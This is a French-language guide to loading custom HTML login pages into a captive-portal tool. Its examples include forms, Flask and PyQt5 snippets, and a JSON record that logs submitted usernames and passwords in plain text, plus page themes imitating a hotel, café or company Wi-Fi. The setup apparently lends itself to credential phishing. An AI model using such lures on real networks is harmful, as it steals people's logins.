# 📄 Guide - Fichier HTML Personnalisé pour Portail Captif

## 🎯 **Vue d'Ensemble**

Cette nouvelle fonctionnalité permet d'utiliser un fichier HTML personnalisé lors de la redirection du portail captif, au lieu des templates prédéfinis.

## ✨ **Fonctionnalités**

### **Avantages**
- **Design personnalisé** : Utilisez vos propres designs HTML/CSS
- **Flexibilité totale** : Contrôle complet sur l'apparence et le comportement
- **JavaScript intégré** : Ajoutez des animations et interactions
- **Responsive design** : Adaptez pour mobile et desktop
- **Branding personnalisé** : Intégrez votre logo et couleurs

### **Utilisation**
1. **Cochez** "Utiliser un fichier HTML personnalisé"
2. **Sélectionnez** votre fichier HTML via "Parcourir"
3. **Validez** le fichier (vérifications automatiques)
4. **Démarrez** le portail captif

## 🔧 **Configuration**

### **Interface Utilisateur**
```
☑️ Utiliser un fichier HTML personnalisé
📁 Fichier HTML: [Parcourir] /chemin/vers/fichier.html
```

### **Validations Automatiques**
- ✅ **Existence** du fichier
- ✅ **Extension** .html ou .htm
- ✅ **Taille** maximale 1MB
- ✅ **Contenu** non vide
- ✅ **Encodage** UTF-8

## 📋 **Structure du Fichier HTML**

### **Exemple Minimal**
```html
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion WiFi</title>
</head>
<body>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Nom d'utilisateur">
        <input type="password" name="password" placeholder="Mot de passe">
        <button type="submit">Se Connecter</button>
    </form>
</body>
</html>
```

### **Exemple Complet (templates/custom_example.html)**
```html
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion WiFi - Exemple Personnalisé</title>
    <style>
        /* CSS personnalisé */
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
        }
        
        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Connexion WiFi Sécurisée</h1>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="username">Nom d'utilisateur</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="btn">Se Connecter</button>
        </form>
    </div>
    
    <script>
        // JavaScript personnalisé
        document.addEventListener('DOMContentLoaded', function() {
            // Animations et interactions
        });
    </script>
</body>
</html>
```

## 🎨 **Bonnes Pratiques**

### **Design**
- **Responsive** : Adaptez pour mobile et desktop
- **Moderne** : Utilisez des gradients et ombres
- **Professionnel** : Couleurs cohérentes et typographie
- **Accessible** : Contrastes suffisants et labels clairs

### **Sécurité**
- **HTTPS** : Indiquez la sécurité SSL
- **Validation** : JavaScript côté client
- **Messages** : Informations claires sur la connexion

### **Performance**
- **Optimisé** : Images compressées
- **Minimal** : CSS et JS optimisés
- **Rapide** : Chargement en < 2 secondes

## 🔍 **Champs de Formulaire Supportés**

### **Champs Requis**
```html
<input type="text" name="username" required>
<input type="password" name="password" required>
```

### **Champs Optionnels**
```html
<input type="email" name="email" placeholder="votre@email.com">
<input type="text" name="phone" placeholder="Téléphone">
<input type="text" name="company" placeholder="Entreprise">
```

### **Types de Données Capturées**
- **Nom d'utilisateur** : `username`
- **Mot de passe** : `password`
- **Email** : `email`
- **Téléphone** : `phone`
- **Entreprise** : `company`
- **Autres** : Champs personnalisés

## 📊 **Métadonnées Capturées**

### **Automatiques**
```json
{
  "timestamp": "2024-01-15T10:30:00",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "template_used": "custom_html",
  "form_data": {
    "username": "john_doe",
    "password": "secret123",
    "email": "john@example.com"
  }
}
```

## 🛠️ **Intégration Technique**

### **Serveur Flask**
```python
def load_custom_html_file(self, file_path):
    """Charge un fichier HTML personnalisé"""
    with open(file_path, 'r', encoding='utf-8') as f:
        self.custom_html_content = f.read()
    return True

def index():
    """Page principale avec HTML personnalisé"""
    if self.custom_html_content:
        return self.custom_html_content
    else:
        return template_content  # Template par défaut
```

### **Interface PyQt5**
```python
def toggle_custom_html(self, enabled):
    """Active/désactive l'option HTML personnalisé"""
    self.html_file_path.setEnabled(enabled)
    self.browse_html_btn.setEnabled(enabled)

def validate_html_file(self, file_path):
    """Valide le fichier HTML sélectionné"""
    # Vérifications de sécurité et format
```

## 🎯 **Scénarios d'Utilisation**

### **1. Page de Connexion Entreprise**
```html
<!-- Design professionnel avec logo entreprise -->
<div class="company-logo">
    <img src="logo.png" alt="Logo Entreprise">
</div>
<h1>Connexion WiFi Entreprise</h1>
```

### **2. Page de Connexion Hôtel**
```html
<!-- Design hôtel avec informations -->
<div class="hotel-info">
    <h2>Bienvenue à l'Hôtel Luxe</h2>
    <p>Connectez-vous pour accéder à Internet</p>
</div>
```

### **3. Page de Connexion Café**
```html
<!-- Design café avec ambiance -->
<div class="cafe-theme">
    <h1>WiFi Café Central</h1>
    <p>Profitez de votre café avec Internet</p>
</div>
```

## 🔒 **Sécurité et Validation**

### **Vérifications Automatiques**
- ✅ **Fichier existe** : Vérification de l'existence
- ✅ **Extension valide** : .html ou .htm uniquement
- ✅ **Taille raisonnable** : Maximum 1MB
- ✅ **Contenu non vide** : Fichier avec contenu
- ✅ **Encodage UTF-8** : Support des caractères spéciaux

### **Messages d'Erreur**
```
❌ "Le fichier HTML n'existe pas."
❌ "Le fichier doit avoir l'extension .html ou .htm"
❌ "Le fichier HTML est trop volumineux (max 1MB)"
❌ "Le fichier HTML est vide"
```

## 📈 **Monitoring et Logs**

### **Logs Automatiques**
```
INFO: Fichier HTML sélectionné: /path/to/custom.html
INFO: Utilisation du fichier HTML personnalisé: /path/to/custom.html
INFO: Fichier HTML personnalisé chargé: /path/to/custom.html
SUCCESS: Fichier HTML personnalisé chargé avec succès
```

### **Informations Capturées**
```python
def get_custom_html_info(self):
    return {
        'file_path': '/path/to/custom.html',
        'is_loaded': True,
        'content_length': 2048
    }
```

## 🎉 **Avantages de la Fonctionnalité**

### **Pour l'Utilisateur**
- **Flexibilité totale** : Design personnalisé
- **Contrôle complet** : HTML/CSS/JS libre
- **Branding** : Intégration de votre identité
- **Professionnalisme** : Pages sur mesure

### **Pour le Développeur**
- **Facilité d'implémentation** : Interface simple
- **Validation robuste** : Vérifications automatiques
- **Intégration transparente** : Compatible existant
- **Documentation complète** : Guides et exemples

## 🚀 **Utilisation Rapide**

### **Étapes**
1. **Créer** votre fichier HTML
2. **Cocher** "Utiliser un fichier HTML personnalisé"
3. **Sélectionner** le fichier via "Parcourir"
4. **Démarrer** le portail captif
5. **Tester** la redirection

### **Exemple de Test**
```bash
# Créer un fichier HTML de test
echo '<html><body><form action="/login" method="POST"><input name="username"><input name="password" type="password"><button type="submit">Login</button></form></body></html>' > test.html

# Utiliser dans l'interface
# 1. Cocher "Utiliser un fichier HTML personnalisé"
# 2. Sélectionner test.html
# 3. Démarrer le portail
# 4. Tester la redirection
```

---

**🎯 Cette fonctionnalité offre une flexibilité maximale pour créer des portails captifs personnalisés et professionnels !** 